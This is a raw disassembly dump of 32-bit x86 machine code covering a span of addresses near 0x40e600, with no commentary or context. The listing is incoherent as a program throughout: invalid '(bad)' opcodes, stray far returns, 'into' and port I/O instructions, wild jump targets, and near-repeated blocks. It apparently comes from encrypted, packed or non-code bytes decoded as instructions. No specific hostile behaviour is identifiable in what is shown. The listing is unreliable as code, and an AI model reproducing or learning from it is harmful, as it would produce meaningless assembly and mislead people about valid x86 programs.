  40e593:	fwait
  40e594:	sub    esi,DWORD PTR [edx]
  40e596:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e59c:	lods   al,BYTE PTR ds:[esi]
  40e59d:	xor    esp,DWORD PTR [ebx]
  40e59f:	add    ecx,DWORD PTR [ebp-0x1c]
  40e5a2:	mov    edi,DWORD PTR [ebp-0x8]
  40e5a5:	mov    bl,cl
  40e5a7:	cmp    dl,bl
  40e5a9:	jb     0x40e579
  40e5ab:	add    dh,dl
  40e5ad:	dec    ebp
  40e5ae:	scas   eax,DWORD PTR es:[edi]
  40e5af:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  40e5b5:	shr    DWORD PTR [ebx],cl
  40e5b7:	into   
  40e5b8:	cmp    edx,esi
  40e5ba:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  40e5c0:	dec    ebp
  40e5c1:	dec    ebp
  40e5c2:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  40e5c8:	retf   
  40e5c9:	xor    edx,esi
  40e5cb:	add    ecx,esi
  40e5cd:	imul   ecx,edx
  40e5d0:	mov    DWORD PTR [ebp+0x8],edx
  40e5d3:	xor    ecx,DWORD PTR [ebp+0x2b]
  40e5d6:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  40e5dc:	add    esi,DWORD PTR [ebx]
  40e5de:	mov    ah,0x3
  40e5e0:	inc    ebp
  40e5e1:	rdtsc  
  40e5e3:	xlat   BYTE PTR ds:[ebx]
  40e5e4:	pushf  
  40e5e5:	jge    0x40e570
  40e5e7:	xor    ebx,eax
  40e5e9:	sub    eax,DWORD PTR [ebp-0x73]
  40e5ec:	(bad)  
  40e5ed:	cmp    al,al
  40e5ef:	jb     0x40e576
  40e5f1:	add    al,bh
  40e5f3:	ror    DWORD PTR [ebp-0x7a],1
  40e5f6:	xor    edi,edi
  40e5f8:	add    edi,edi
  40e5fa:	jmp    0x40e649
  40e5fc:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40e602:	dec    ebp
  40e603:	into   
  40e604:	mov    ebp,DWORD PTR [edi-0x23737428]
  40e60a:	fwait
  40e60b:	shl    DWORD PTR [edx],cl
  40e60d:	retf   0x5588
  40e610:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40e616:	add    eax,DWORD PTR [eax]
  40e618:	in     al,0x4d
  40e61a:	push   ebp
  40e61b:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  40e621:	gs add ch,cl
  40e624:	dec    ebp
  40e625:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  40e62b:	dec    ebp
  40e62c:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  40e632:	jge    0x40e602
  40e634:	mov    BYTE PTR [edi+0xf723b3a],ch
  40e63a:	add    cl,dh
  40e63c:	dec    ebp
  40e63d:	dec    DWORD PTR [ebx-0x2c032375]
  40e643:	adc    BYTE PTR [ebp+0x1],0x8b
  40e647:	add    al,bl
  40e649:	jge    0x40e5d7
  40e64b:	push   0xffffff9b
  40e64d:	push   0x8b3032
  40e652:	shl    BYTE PTR [ebp+0x55],0x6a
  40e656:	xor    edi,edi
  40e658:	xor    edx,DWORD PTR [ebx+eax*1]
  40e65b:	inc    ebp
  40e65c:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  40e662:	dec    ebp
  40e663:	or     BYTE PTR [ecx+0x4dc8e483],cl
  40e669:	jbe    0x40e5f6
  40e66b:	mov    ebp,esp
  40e66d:	ror    bl,1
  40e66f:	enter  0x14ce,0xaf
  40e673:	dec    DWORD PTR [ebx-0x2cef17f8]
  40e679:	push   ebp
  40e67a:	retf   0x5540
  40e67d:	push   ebp
  40e67e:	mov    esi,DWORD PTR [edx-0x1c]
  40e681:	mov    edx,ebx
  40e683:	cld    
  40e684:	(bad)  
  40e685:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  40e68c:	sti    
  40e68d:	add    dh,cl
  40e68f:	push   0xffffff94
  40e691:	call   FWORD PTR [ebx+0x3b5032d0]
  40e697:	mov    ecx,DWORD PTR [edi]
  40e699:	int3   
  40e69a:	pop    esi
  40e69b:	inc    ebp
  40e69c:	dec    DWORD PTR [ecx+0x45e8c88b]
  40e6a2:	push   ebp
  40e6a3:	xor    esi,DWORD PTR [ebx]
  40e6a5:	mov    DWORD PTR [ebx],0xcace0f9c
  40e6ab:	aas    
  40e6ac:	push   ebp
  40e6ad:	inc    ebp
  40e6ae:	xor    edx,esi
  40e6b0:	add    edx,esi
  40e6b2:	mov    eax,DWORD PTR [ebx]
  40e6b4:	(bad)  
  40e6b5:	jmp    0x40e643
  40e6b7:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  40e6bd:	rol    ah,1
  40e6bf:	mov    esi,0xf133104d
  40e6c4:	mov    edx,0xff388d80
  40e6c9:	mov    dh,0xd1
  40e6cb:	cmp    edx,DWORD PTR [ebp+0xf]
  40e6ce:	mov    eax,DWORD PTR [edx-0x20]
  40e6d1:	add    BYTE PTR [ebp-0x75],bh
  40e6d4:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  40e6db:	fwait
  40e6dc:	retf   0x8632
  40e6df:	cmp    ebp,0x8
  40e6e2:	call   ebx
  40e6e4:	inc    ebp
  40e6e5:	inc    ebp
  40e6e6:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  40e6ec:	mov    esi,DWORD PTR [ecx]
  40e6ee:	enter  0x49c,0xc7
  40e6f2:	add    al,al
  40e6f4:	add    bl,al
  40e6f6:	(bad)  
  40e6f7:	clc    
  40e6f8:	enter  0x45,0x31
  40e6fc:	push   eax
  40e6fd:	pushf  
  40e6fe:	mov    edi,eax
  40e700:	int3   
  40e701:	or     al,al
  40e703:	test   DWORD PTR [edi],edi
  40e705:	clc    
  40e706:	gs inc ebp
  40e708:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  40e70e:	push   ss
  40e70f:	xor    ecx,DWORD PTR [ebp+0x3]
  40e712:	sub    edx,DWORD PTR [ecx-0x76]
  40e715:	dec    ebp
  40e716:	add    DWORD PTR [ebx+0x88d845],ecx
  40e71c:	mov    esi,DWORD PTR [ebx]
  40e71e:	or     BYTE PTR [ebx],al
  40e720:	cmp    edx,DWORD PTR [ecx-0x38]
  40e723:	dec    ebp
  40e724:	out    dx,eax
  40e725:	xor    eax,DWORD PTR [ebp+0x3]
  40e728:	mov    edx,DWORD PTR [ecx-0x28]
  40e72b:	dec    ebp
  40e72c:	add    BYTE PTR [ebx],dh
  40e72e:	push   0x518003
  40e733:	push   eax
  40e734:	add    BYTE PTR [ebx-0x300748b],cl
  40e73a:	sbb    BYTE PTR [ebp+0x45],cl
  40e73d:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40e743:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  40e749:	dec    ebp
  40e74a:	inc    ebp
  40e74b:	xor    edx,esi
  40e74d:	add    edx,esi
  40e74f:	push   ecx
  40e750:	(bad)  
  40e751:	dec    ebp
  40e752:	mov    al,ds:0xc5e03dff
  40e757:	retf   
  40e758:	(bad)  
  40e759:	into   
  40e75a:	sub    bh,bh
  40e75c:	dec    esp
  40e75d:	adc    al,0x9c
  40e75f:	inc    ebp
  40e760:	push   ebp
  40e761:	test   DWORD PTR [edi],ecx
  40e763:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  40e76a:	jmp    0xc9b9f67e
  40e76f:	add    cl,dl
  40e771:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  40e77b:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  40e781:	rol    BYTE PTR [eax],0x54
  40e784:	clc    
  40e785:	gs jb  0x40e78f
  40e788:	mov    eax,DWORD PTR [ebp-0x30]
  40e78b:	xor    al,0x40
  40e78d:	sub    al,0xc7
  40e78f:	mov    ah,ch
  40e791:	add    DWORD PTR [ebp+0x4534f845],eax
  40e797:	sub    al,0x80
  40e799:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  40e7a0:	mov    ch,0xff
  40e7a2:	clc    
  40e7a3:	add    DWORD PTR [ebp+0x60],0x3d
  40e7a7:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  40e7ae:	inc    ebp
  40e7af:	dec    DWORD PTR [ebx-0x341ff701]
  40e7b5:	test   esi,ecx
  40e7b7:	dec    DWORD PTR [ebx-0x7f8a3301]
  40e7bd:	push   eax
  40e7be:	add    DWORD PTR [ebp+0x0],eax
  40e7c1:	dec    ebx
  40e7c3:	or     al,0xce
  40e7c5:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  40e7cc:	into   
  40e7cd:	add    BYTE PTR [ebx-0x34ff1400],cl
  40e7d3:	mov    esi,ecx
  40e7d5:	sar    bh,0x45
  40e7d8:	adc    al,0x8b
  40e7da:	clc    
  40e7db:	fadd   DWORD PTR [ebp+0x0]
  40e7de:	mov    ebp,DWORD PTR [edx+0x8]
  40e7e1:	push   edi
  40e7e2:	adc    BYTE PTR [eax+0x1],0x83
  40e7e6:	add    al,al
  40e7e8:	retf   
  40e7e9:	mov    ecx,esi
  40e7eb:	cld    
  40e7ec:	mov    eax,DWORD PTR [eax+0xcb01cc]
  40e7f2:	into   
  40e7f3:	add    BYTE PTR [ebx+0x756aec00],cl
  40e7f9:	jne    0x40e82e
  40e7fb:	inc    DWORD PTR [ebx]
  40e7fd:	rcl    BYTE PTR [ecx+0x50],1
  40e800:	push   eax
  40e801:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  40e807:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  40e80e:	sar    bh,0x84
  40e811:	or     BYTE PTR [ebx],al
  40e813:	push   eax
  40e814:	add    BYTE PTR [ebx+0x453cc845],cl
  40e81a:	pushf  
  40e81b:	xor    edi,eax
  40e81d:	pushf  
  40e81e:	mov    ah,0x89
  40e820:	test   eax,ebp
  40e822:	clc    
  40e823:	inc    ebp
  40e824:	inc    ebp
  40e825:	mov    DWORD PTR [eax+eax*8],esi
  40e828:	sub    al,0x32
  40e82a:	mov    BYTE PTR [ebx+ecx*4+0x54d8ec89],bl
  40e831:	dec    ebp
  40e832:	xor    eax,DWORD PTR gs:[edi+0x3]
  40e836:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  40e83c:	xor    eax,DWORD PTR gs:[edi+0x3]
  40e840:	or     DWORD PTR [ecx+0x45ff085c],0x0
  40e847:	shl    DWORD PTR [ebp-0x380064],1
  40e84d:	int3   
  40e84e:	lea    eax,[ebp+0x45fff860]
  40e854:	push   eax
  40e855:	cmp    al,0x75
  40e857:	pushf  
  40e858:	(bad)  
  40e859:	(bad)  
  40e85a:	pop    esp
  40e85b:	lods   al,BYTE PTR ds:[esi]
  40e85c:	inc    DWORD PTR [ebp+0x4508f8ff]
  40e862:	mov    edi,DWORD PTR [esi]
  40e864:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  40e86b:	test   DWORD PTR [edi-0x8],edx
  40e86e:	inc    esi
  40e86f:	inc    ebp
  40e870:	add    BYTE PTR [eax],bh
  40e872:	push   0x8b809c
  40e877:	in     al,dx
  40e878:	inc    ebp
  40e879:	push   ebp
  40e87a:	mov    esi,DWORD PTR [ebx]
  40e87c:	cld    
  40e87d:	add    eax,DWORD PTR [eax+0xf013b]
  40e883:	adc    al,0x0
  40e885:	add    bh,bh
  40e887:	jmp    0xbde9a4
  40e88c:	add    BYTE PTR [ebp+0x45],cl
  40e88f:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  40e895:	dec    ebp
  40e896:	push   0x38033
  40e89b:	cmp    eax,DWORD PTR [eax]
  40e89d:	unpcklps xmm7,xmm0
  40e8a0:	jne    0x40e8a2
  40e8a2:	dec    DWORD PTR [ebx+0x5545cc18]
  40e8a8:	mov    DWORD PTR [ebx],esi
  40e8aa:	shl    BYTE PTR [ebx],1
  40e8ac:	inc    ebp
  40e8ad:	add    ecx,DWORD PTR [ecx+0x60fc803]
  40e8b3:	retf   0x5575
  40e8b6:	dec    DWORD PTR [ebx-0x5ba17e8]
  40e8bc:	(bad)  
  40e8bd:	stc    
  40e8be:	in     al,dx
  40e8bf:	or     al,0x85
  40e8c1:	dec    ebp
  40e8c2:	clc    
  40e8c3:	xor    eax,DWORD PTR [ebp+0x3]
  40e8c6:	mov    ebp,ecx
  40e8c8:	rol    BYTE PTR [eax],1
  40e8ca:	inc    ebp
  40e8cb:	add    BYTE PTR [eax-0x7747ab3],bh
  40e8d1:	clc    
  40e8d2:	inc    ebp
  40e8d3:	retf   
  40e8d4:	mov    edx,ebx
  40e8d6:	in     al,dx
  40e8d7:	(bad)  
  40e8d8:	retf   
  40e8d9:	into   
  40e8da:	into   
  40e8db:	scas   eax,DWORD PTR es:[edi]
  40e8dc:	dec    ebp
  40e8dd:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  40e8e3:	sub    ecx,esi
  40e8e5:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e8e8:	(bad)  
  40e8e9:	mov    edi,eax
  40e8eb:	int3   
  40e8ec:	test   DWORD PTR [ecx-0x74baff08],ecx
  40e8f2:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  40e8f9:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e8ff:	(bad)  
  40e901:	retf   0x559c
  40e904:	(bad)  
  40e905:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  40e90c:	inc    ebp
  40e90d:	add    eax,0xeb9c4d3f
  40e912:	(bad)  
  40e913:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  40e919:	xor    ecx,DWORD PTR [ebp+0x33]
  40e91c:	mov    eax,DWORD PTR [ebx]
  40e91e:	call   0xce50b426
  40e923:	retf   0x55d1
  40e926:	test   BYTE PTR [ebx-0x5ff17fe],cl
  40e92c:	jmp    0x40e927
  40e92e:	add    BYTE PTR ds:0xebf44d8b,al
  40e934:	push   ebp
  40e935:	mov    ebp,DWORD PTR [ebx]
  40e937:	mov    eax,0x33f8558b
  40e93c:	retf   
  40e93d:	xor    ecx,esi
  40e93f:	add    edx,ecx
  40e941:	add    eax,DWORD PTR [edx+0xca010f]
  40e947:	push   ebp
  40e948:	dec    ebp
  40e949:	mov    ecx,DWORD PTR [ebx-0x34050718]
  40e94f:	stc    
  40e950:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e956:	scas   eax,DWORD PTR es:[edi]
  40e957:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  40e95d:	xor    ebp,DWORD PTR [ebx]
  40e95f:	xor    edi,DWORD PTR [ebx]
  40e961:	add    esi,DWORD PTR [edi+0x3]
  40e964:	mov    ecx,DWORD PTR [edi]
  40e966:	clc    
  40e967:	retf   0x55cb
  40e96a:	into   
  40e96b:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  40e972:	test   al,0x4d
  40e974:	push   ebp
  40e975:	jbe    0x40e9aa
  40e977:	mov    esi,DWORD PTR [ebx]
  40e979:	mov    al,0x3
  40e97b:	push   ebp
  40e97c:	add    esi,DWORD PTR [ebx]
  40e97e:	rdpmc  
  40e980:	retf   0x5503
  40e983:	add    ecx,DWORD PTR [ebx-0x53517f1]
  40e989:	dec    ebp
  40e98a:	stc    
  40e98b:	mov    ecx,DWORD PTR [eax]
  40e98d:	or     BYTE PTR [ebp+0x4d],cl
  40e990:	jmp    0x134ea20
  40e995:	dec    ebp
  40e996:	dec    ebp
  40e997:	(bad)  
  40e998:	mov    ebx,esp
  40e99a:	clc    
  40e99b:	test   ebx,ecx
  40e99d:	clc    
  40e99e:	ror    DWORD PTR [ebp-0x2a],cl
  40e9a1:	mov    esi,ecx
  40e9a3:	lock scas eax,DWORD PTR es:[edi]
  40e9a5:	inc    ebp
  40e9a6:	mov    esi,DWORD PTR [ebx]
  40e9a8:	hlt    
  40e9a9:	pushf  
  40e9aa:	jge    0x40e937
  40e9ac:	sub    ebx,esp
  40e9ae:	cmp    ecx,ebx
  40e9b0:	ja     0x40e980
  40e9b2:	mov    ebp,DWORD PTR [eax-0x58]
  40e9b5:	dec    ebp
  40e9b6:	xor    ecx,DWORD PTR [di+0x3]
  40e9ba:	mov    esp,esp
  40e9bc:	clc    
  40e9bd:	push   ebp
  40e9be:	retf   
  40e9bf:	mov    dl,bl
  40e9c1:	adc    esi,edx
  40e9c3:	jb     0x40e993
  40e9c5:	add    BYTE PTR [edi-0xb7474b3],ch
  40e9cb:	lock jge 0x40e999
  40e9ce:	sub    ecx,DWORD PTR [ebp+0x3b]
  40e9d1:	mov    esi,DWORD PTR [edi-0x20]
  40e9d4:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  40e9db:	mov    BYTE PTR [ebx-0x34b20729],cl
  40e9e1:	mov    edx,ebx
  40e9e3:	lock (bad) 
  40e9e5:	ror    esi,cl
  40e9e7:	push   ebp
  40e9e8:	scas   eax,DWORD PTR es:[edi]
  40e9e9:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  40e9ef:	fwait
  40e9f0:	sub    esi,DWORD PTR [edx]
  40e9f2:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e9f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9f9:	xor    esp,DWORD PTR [ebx]
  40e9fb:	add    ecx,DWORD PTR [ebp-0x1c]
  40e9fe:	mov    edi,DWORD PTR [ebp-0x8]
  40ea01:	mov    bl,cl
  40ea03:	cmp    dl,bl
  40ea05:	jb     0x40e9d5
  40ea07:	add    dh,dl
  40ea09:	dec    ebp
  40ea0a:	scas   eax,DWORD PTR es:[edi]
  40ea0b:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  40ea11:	shr    DWORD PTR [ebx],cl
  40ea13:	into   
  40ea14:	cmp    edx,esi
  40ea16:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  40ea1c:	dec    ebp
  40ea1d:	dec    ebp
  40ea1e:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  40ea24:	retf   
  40ea25:	xor    edx,esi
  40ea27:	add    ecx,esi
  40ea29:	imul   ecx,edx
  40ea2c:	mov    DWORD PTR [ebp+0x8],edx
  40ea2f:	xor    ecx,DWORD PTR [ebp+0x2b]
  40ea32:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  40ea38:	add    esi,DWORD PTR [ebx]
  40ea3a:	rol    BYTE PTR [ebx],0x45
  40ea3d:	rdtsc  
  40ea3f:	xlat   BYTE PTR ds:[ebx]
  40ea40:	pushf  
  40ea41:	jge    0x40e9cc
  40ea43:	xor    esp,eax
  40ea45:	sub    eax,DWORD PTR [ebp-0x73]
  40ea48:	(bad)  
  40ea49:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  40ea50:	dec    ebp
  40ea51:	xchg   BYTE PTR [ebx],dh
  40ea53:	inc    DWORD PTR [ebx]
  40ea55:	(bad)  
  40ea56:	jmp    0x40eaa5
  40ea58:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40ea5e:	dec    ebp
  40ea5f:	into   
  40ea60:	mov    ebp,DWORD PTR [edi-0x23737420]
  40ea66:	fwait
  40ea67:	shl    DWORD PTR [edx],cl
  40ea69:	retf   0x5588
  40ea6c:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40ea72:	add    eax,DWORD PTR [eax]
  40ea74:	in     al,0x4d
  40ea76:	push   ebp
  40ea77:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  40ea7d:	gs add ch,cl
  40ea80:	dec    ebp
  40ea81:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  40ea87:	dec    ebp
  40ea88:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  40ea8e:	jge    0x40ea5e
  40ea90:	mov    BYTE PTR [edi+0xf723b3a],ch
  40ea96:	add    cl,dh
  40ea98:	dec    ebp
  40ea99:	dec    DWORD PTR [ebx-0x2c032301]
  40ea9f:	inc    ebp
  40eaa0:	push   ebp
  40eaa1:	dec    DWORD PTR [ebx-0x73ff1f34]
  40eaa7:	lea    ebx,[ebx-0x7400cdac]
  40eaad:	push   eax
  40eaae:	mov    ah,0x45
  40eab0:	push   ebp
  40eab1:	mov    esi,DWORD PTR [ebx]
  40eab3:	les    esi,FWORD PTR [ebx]
  40eab5:	add    BYTE PTR [ebx],al
  40eab7:	inc    DWORD PTR [ebx]
  40eab9:	mov    ecx,DWORD PTR [edi]
  40eabb:	cld    
  40eabc:	retf   0x4d80
  40eabf:	add    DWORD PTR [ecx+0x4d30e400],ecx
  40eac5:	jne    0x40ea52
  40eac7:	(bad)  
  40eac8:	in     al,dx
  40eac9:	ror    bl,1
  40eacb:	scas   al,BYTE PTR es:[edi]
  40eacc:	into   
  40eacd:	add    BYTE PTR [edi-0xf2f7475],ch
  40ead3:	not    bl
  40ead5:	adc    al,0xca
  40ead7:	inc    ebp
  40ead8:	push   ebp
  40ead9:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  40eadf:	push   0xaf80d6
  40eae4:	mov    eax,DWORD PTR [eax]
  40eae6:	fdiv   st(7),st
  40eae8:	sti    
  40eae9:	sbb    dh,cl
  40eaeb:	pop    esi
  40eaec:	xchg   esp,eax
  40eaed:	leave  
  40eaee:	fwait
  40eaef:	add    al,0x32
  40eaf1:	push   ebp
  40eaf2:	cmp    ebp,esp
  40eaf4:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  40eaf8:	dec    DWORD PTR [ecx-0x740f0375]
  40eafe:	push   ebp
  40eaff:	cld    
  40eb00:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  40eb06:	retf   0x558b
  40eb09:	clc    
  40eb0a:	xor    esi,eax
  40eb0c:	add    esi,DWORD PTR [ebp-0x75]
  40eb0f:	(bad)  
  40eb10:	hlt    
  40eb11:	or     cl,BYTE PTR [esi+eax*8-0x39cdf765]
  40eb18:	mov    DWORD PTR [edx],ecx
  40eb1a:	hlt    
  40eb1b:	(bad)  
  40eb1c:	dec    ebp
  40eb1d:	add    dh,BYTE PTR [ebx]
  40eb1f:	leave  
  40eb20:	mov    edx,0xffec8d55
  40eb25:	push   ecx
  40eb26:	rol    DWORD PTR [ebp+0x55],1
  40eb29:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  40eb2f:	mov    eax,0xf8030b33
  40eb34:	lar    ecx,di
  40eb37:	push   ebp
  40eb38:	retf   0x863b
  40eb3b:	jne    0x40eb3a
  40eb3d:	mov    edi,edi
  40eb3f:	or     BYTE PTR [ebp+0x41],dh
  40eb42:	mov    ebp,edx
  40eb44:	cld    
  40eb45:	inc    eax
  40eb46:	mov    al,0x25
  40eb48:	add    DWORD PTR [ecx+0x0],eax
  40eb4b:	in     eax,dx
  40eb4c:	test   DWORD PTR [ecx-0x1],eax
  40eb4f:	(bad)  
  40eb51:	ret    0x8b
  40eb54:	cld    
  40eb55:	mov    eax,DWORD PTR [eax+0x8d0151]
  40eb5b:	clc    
  40eb5c:	xor    BYTE PTR [ebp+0x45],al
  40eb5f:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  40eb65:	loopne 0x40eb66
  40eb67:	mov    edi,edi
  40eb69:	mov    ecx,eax
  40eb6b:	clc    
  40eb6c:	jne    0x40eb3e
  40eb6e:	call   0x81fc77
  40eb73:	and    eax,0xc6854575
  40eb78:	je     0x40eb7b
  40eb7a:	mov    eax,esi
  40eb7c:	cld    
  40eb7d:	or     DWORD PTR [eax+0x401c9],eax
  40eb83:	push   ebp
  40eb84:	add    ah,ch
  40eb86:	add    BYTE PTR [ecx+0x6a],dl
  40eb89:	inc    ebp
  40eb8a:	push   esi
  40eb8b:	mov    DWORD PTR [eax-0x4],edx
  40eb8e:	pop    edi
  40eb8f:	mov    ebx,DWORD PTR [ebx-0x4]
  40eb92:	ret    0xb8
  40eb95:	push   es
  40eb96:	mov    ecx,DWORD PTR [ecx-0x77274af]
  40eb9c:	clc    
  40eb9d:	lock inc ebp
  40eb9f:	jne    0x40ebf7
  40eba1:	(bad)  
  40eba2:	jne    0x40eba8
  40eba4:	mov    eax,0xf841ba66
  40eba9:	fiadd  DWORD PTR [esi]
  40ebab:	(bad)  
  40ebac:	jne    0x40ebeb
  40ebae:	cmp    eax,ebx
  40ebb0:	pop    esi
  40ebb1:	mov    ecx,DWORD PTR [eax]
  40ebb3:	push   ecx
  40ebb4:	inc    ecx
  40ebb5:	lea    edi,[esi-0x8]
  40ebb8:	inc    edx
  40ebb9:	inc    ebp
  40ebba:	int    0x8b
  40ebbc:	inc    edx
  40ebbd:	cld    
  40ebbe:	jle    0x40eb7f
  40ebc0:	inc    ecx
  40ebc1:	xchg   eax,esp
  40ebc3:	mov    ebx,eax
  40ebc5:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  40ebcb:	or     edi,eax
  40ebcd:	inc    ebp
  40ebce:	inc    ebp
  40ebcf:	(bad)  
  40ebd0:	mov    ecx,DWORD PTR [eax]
  40ebd2:	cld    
  40ebd3:	(bad)  
  40ebd4:	jmp    0x40ebd7
  40ebd6:	mov    eax,esi
  40ebd8:	mov    DWORD PTR ds:0x4f8c98b,eax
  40ebde:	rcl    BYTE PTR [esi+0xf],1
  40ebe1:	iret   
  40ebe2:	inc    ebp
  40ebe3:	leave  
  40ebe4:	(bad)  
  40ebe5:	dec    DWORD PTR [ecx]
  40ebe7:	mov    eax,esi
  40ebe9:	mov    eax,DWORD PTR [edi]
  40ebeb:	mov    dh,0xdd
  40ebee:	push   es
  40ebef:	nop
  40ebf0:	(bad)  
  40ebf1:	inc    DWORD PTR [ebx]
  40ebf3:	push   esi
  40ebf4:	leave  
  40ebf5:	iret   
  40ebf6:	add    al,0x46
  40ebf8:	push   ebp
  40ebf9:	jmp    0xff9241ea
  40ebfe:	inc    ebp
  40ebff:	push   esi
  40ec00:	mov    DWORD PTR [esi-0x4],eax
  40ec03:	in     eax,dx
  40ec04:	push   ebp
  40ec05:	sbb    BYTE PTR [eax+0x7c6daff],bh
  40ec0b:	add    al,BYTE PTR [edx]
  40ec0d:	mov    edx,DWORD PTR [ebp-0x17]
  40ec10:	cmp    edi,esi
  40ec12:	jne    0x40ec13
  40ec14:	(bad)  
  40ec15:	push   esi
  40ec16:	pop    es
  40ec17:	push   ebp
  40ec18:	mov    ebp,esp
  40ec1a:	or     BYTE PTR [ebp+0x41],al
  40ec1d:	add    edi,esp
  40ec1f:	sub    BYTE PTR [eax-0x4],al
  40ec22:	retf   0xc275
  40ec25:	add    DWORD PTR [eax],eax
  40ec27:	sbb    al,0x8b
  40ec29:	mov    edx,DWORD PTR [ecx+0x14]
  40ec2c:	lea    edx,[edx-0x1ba7508]
  40ec32:	push   esi
  40ec33:	enter  0xd375,0xb8
  40ec37:	test   DWORD PTR [esi],0x6ce0750
  40ec3d:	enter  0xd375,0x3b
  40ec41:	neg    DWORD PTR [esi+0x50]
  40ec44:	or     cl,dl
  40ec46:	inc    edx
  40ec47:	(bad)  
  40ec48:	loope  0x40ec36
  40ec4a:	(bad)  
  40ec4b:	sub    eax,DWORD PTR [ebx]
  40ec4d:	inc    eax
  40ec4e:	loope  0x40eca0
  40ec50:	add    dl,BYTE PTR [eax-0x37]
  40ec53:	push   edi
  40ec54:	push   ebp
  40ec55:	imul   ah
  40ec57:	adc    DWORD PTR [ecx-0x1],0x45
  40ec5b:	add    BYTE PTR [ecx+0x55d3fc00],cl
  40ec61:	lea    edi,[eax-0x7fff4ca]
  40ec67:	mov    eax,0x4550402
  40ec6c:	cmp    ebp,ecx
  40ec6e:	jne    0x40ec1b
  40ec70:	mov    eax,DWORD PTR ds:0x241e808
  40ec76:	in     eax,dx
  40ec77:	add    BYTE PTR [eax-0x7],al
  40ec7a:	out    0x36,eax
  40ec7c:	inc    ecx
  40ec7d:	aas    
  40ec7e:	jmp    0xccaf00
  40ec83:	lock mov edi,DWORD PTR [ebp-0x18]
  40ec87:	and    edi,edi
  40ec89:	mov    edi,edi
  40ec8b:	call   0xe40eed67
  40ec90:	push   es
  40ec91:	add    al,ch
  40ec93:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  40ec9a:	(bad)  
  40ec9b:	hlt    
  40ec9c:	add    eax,0xffd3e87d
  40eca1:	cmp    bh,0x8
  40eca4:	(bad)  
  40eca5:	fld    DWORD PTR [esi]
  40eca7:	out    dx,al
  40eca8:	call   0xff9febb0
  40ecad:	cmp    al,0x46
  40ecaf:	shl    eax,0x8
  40ecb2:	(bad)  
  40ecb3:	pop    es
  40ecb4:	fisttp QWORD PTR [ebp+0xe577eff]
  40ecba:	push   ebx
  40ecbb:	add    BYTE PTR [ebx+0x24008b56],cl
  40ecc1:	add    BYTE PTR [ebp+0x50],al
  40ecc4:	push   eax
  40ecc5:	add    DWORD PTR [ebx+0x757d1834],ecx
  40eccb:	sub    edx,DWORD PTR [esi-0x24]
  40ecce:	jne    0x40ec86
  40ecd0:	lods   eax,DWORD PTR ds:[esi]
  40ecd1:	mov    edx,DWORD PTR [edx-0x34]
  40ecd4:	dec    esi
  40ecd5:	out    0x83,eax
  40ecd7:	into   
  40ecd8:	push   edi
  40ecda:	loopne 0x40ecaa
  40ecdc:	shr    BYTE PTR [edx+ecx*4+0x0],1
  40ece0:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  40ece7:	rol    DWORD PTR [edx],0x8
  40ecea:	mov    esp,ecx
  40ecec:	cmp    DWORD PTR [ebx],0xc
  40ecef:	mov    esi,0x5001c0
  40ecf4:	push   eax
  40ecf5:	push   cs
  40ecf6:	push   eax
  40ecf7:	(bad)  
  40ecf8:	sub    edx,edi
  40ecfa:	push   esi
  40ecfb:	adc    al,0xcb
  40ecfd:	ins    DWORD PTR es:[edi],dx
